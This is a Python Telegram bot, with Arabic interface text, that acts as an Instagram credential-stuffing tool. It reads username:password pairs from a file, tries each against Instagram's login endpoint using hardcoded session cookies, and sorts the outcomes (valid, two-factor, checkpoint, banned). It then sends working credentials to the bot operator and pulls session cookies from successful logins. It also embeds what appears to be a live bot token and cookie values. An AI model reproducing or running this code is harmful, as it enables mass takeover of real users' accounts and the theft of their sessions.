import requests

import time

import telebot

#from os import system as cmd

from telebot import types

token = "1605426958:AAGjEhz8N5jLQpux5sAJb1ZUgjN_flTaUww"

bot = telebot.TeleBot(token)

@bot.message_handler(commands=['start'])

def start(message):

    START = types.InlineKeyboardButton(text =" START BOT ", callback_data = 'START')

    maac = types.InlineKeyboardMarkup()

    maac.row_width = 1

    maac.add(START)

    bot.send_message(message.chat.id,text=f"*مرحبا بك في بوت صيد الحسابات انستجرام \nمبرمج البوت @MVMVP - @W_Y67*",parse_mode="markdown",reply_markup=maac)

@bot.callback_query_handler(func=lambda call: True)

def clase(call):

	if call.data=='START':		ran = types.InlineKeyboardButton(text =" بدء الصيد 🏹 ", callback_data = 'ran')

		maac1 = types.InlineKeyboardMarkup()

		maac1.row_width = 2

		maac1.add(ran)

		bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text=f"* مرحبا بك في بوت صيد الحسابات\nBy :@MVMVP*",parse_mode="markdown",reply_markup=maac1)

	elif call.data =="ran":

			message = call.message

			

				

			try:

				file = open('user1.txt','r').read().splitlines()

			except IndexError as error :

				print(error)

			c ='https://www.instagram.com/accounts/login/ajax/'

			sk=0

			br=0

			gm=0

			ya=0

			er =0

			Ba=0

			timm=0

			for us in file:

					username=us.split(':')[0]

					password =us.split(':')[1]

					head1 = {

							        'accept': '*/*',

							        'accept-encoding': 'gzip, deflate, br',

							        'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',

							        'content-length': '319',

							        'content-type': 'application/x-www-form-urlencoded',

							        'cookie': 'mid=YrX_FwABAAFVRYLepbLqUSO9nyBK; ig_did=B86D9D0C-8059-4D38-AB32-62F66F91EB8A; ig_nrcb=1; shbid="6887\054479320179\0541687630562:01f72f17d27d1bf82c5011a7e21c360468f4e96ffc8c8d9bc8f3389196b275ab0b6d598c"; shbts="1656094562\054479320179\0541687630562:01f75b9e3dad31375f7599a21ee1e6b0b33b430c850ee605a7591dd83682126848a683cd"; dpr=3; datr=av-1Yj1HLbt2sRgtjJ2hIyTk; rur="ASH\054479320179\0541687707865:01f7969a9a044b6e5a39c124177ea698ce171408d797be83e4e94e6efc69642ea3b90ed9"; csrftoken=QZnASSTl4lB3b1sG610j7UGrPk0TfrN0',#كوكيز مهمة جداا

							        'origin': 'https://www.instagram.com',

							        'referer': 'https://www.instagram.com/',

							        'sec-ch-prefers-color-scheme': 'light',

							        'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',

							        'sec-ch-ua-mobile': '?1',

							        'sec-ch-ua-platform': '"Android"',

							        'sec-fetch-dest': 'empty',

							        'sec-fetch-mode': 'cors',

							        'sec-fetch-site': 'same-origin',

							        'user-agent': 'Mozilla/5.0 (Linux; Android 10; JSN-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',

							        'viewport-width': '360',

							        'x-asbd-id': '437806',

							        'x-csrftoken': 'QZnASSTl4lB3b1sG610j7UGrPk0TfrN0',

							        'x-ig-app-id': '1217981644879628',

							        'x-ig-www-claim': 'hmac.AR2oFTCuitCzXvttHXW3DD1kZLwzL7oauskQL1Jp6ogO6FF6',

							        'x-instagram-ajax': '57ac339ce6f4',

							        'x-requested-with': 'XMLHttpRequest'

							    }

					tim = str(time.time()).split('.')[1]#الوقت اليوم لكن في الاعداد العشرية

					data1 = {

							        'username': f"{username}",

							        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{tim}:{password}',

							        'queryParams': '{}',

							        'optIntoOneTap': 'false',

							        'trustedDeviceRecords': '{}'

							    }

					rq = requests.post(c,headers=head1,data=data1).text

					

					if ('"Your account has been permanently disabled because it didn') in rq:

						gm+=1

						bot.send_message(message.chat.id,f" Band : \n{username} : {password}\nBy : @MVMVP")

						

					if ('"two_factor_required"') in rq:

	

						ya+=1

						bot.send_message(message.chat.id,f" Number User :\nUsername : {username}\nPassword :  {password}\nBy : @MVMVP")

						

							

							    

							    

					if ('"userId"') in rq:

						br+=1

						bot.send_message(message.chat.id,f" Hit :\nUsername : {username}\nPassword : {password}\nBy : @MVMVP")

						co = rq.cookies

						coo =co.get_dict()

						tok = coo['sessionid']#لستخراج التوكن قم بكتابة print(tok

						cookiee = f"sessionid={coo['sessionid']};ds_user_id={coo['ds_user_id']};csrftoken={coo['csrftoken']}"

						

								

					if ('"checkpoint_required"') in rq:

						sk+=1

						bot.send_message(message.chat.id,f" Scuer\nUser : {username}\nPassword : {password}\nBy : @MVMVP - @W_Y67")

					if ('Not Old Enough to Use Instagram"') in rq:

						Ba+=1

						bot.send_message(message.chat.id,f" Band Old 13 Yaer\nUser : {username}\nPassword : {password}\nBy : @MVMVP - @W_Y67")

					if ('"Please wait a few minutes before you try again."') in rq:

						timm+=1

						

					

						

						#سكيور 

							#كلمة المرور خطأ او الحساب

					else:

						er+=1

						aac = types.InlineKeyboardMarkup()

						aac.row_width = 2

						i1 = types.InlineKeyboardButton(text =f"No Password 📍: {er} ", callback_data = 'c')

						i2 = types.InlineKeyboardButton(text =f"Hit ✅ : {br}", callback_data = 'c')

						i3 = types.InlineKeyboardButton(text =f"Scueer 📍: {sk} ", callback_data = 'c')

						i4 = types.InlineKeyboardButton(text =f"Band ✅: {gm} ", callback_data = 'c')

						i5 = types.InlineKeyboardButton(text =f"Number User 📍: {ya} ", callback_data = 'c')

						i6 = types.InlineKeyboardButton(text =f"Band Old Year 13 ✔️: {Ba} ", callback_data = 'c')

						i7= types.InlineKeyboardButton(text =f"Time  🕚: {timm} ", callback_data = 'c')

						i13= types.InlineKeyboardButton(text =f" 👉 {username}  : {password} 👈", callback_data = 'c')

						aac.add(i1,i2,i3,i4,i5,i6,i7,i13)

						bot.edit_message_text(chat_id=call.message.chat.id,message_id=call.message.message_id,text="جار الفحص......✔️",parse_mode="markdown",reply_markup=aac)

			bot.send_message(message.chat.id,f" تم انتهاء الفحص ✅.")

						

while True:

	try:

		bot.polling(none_stop=True)

	except Exception as e:

	       print(e)

	       time.sleep(3)

				

			

				 
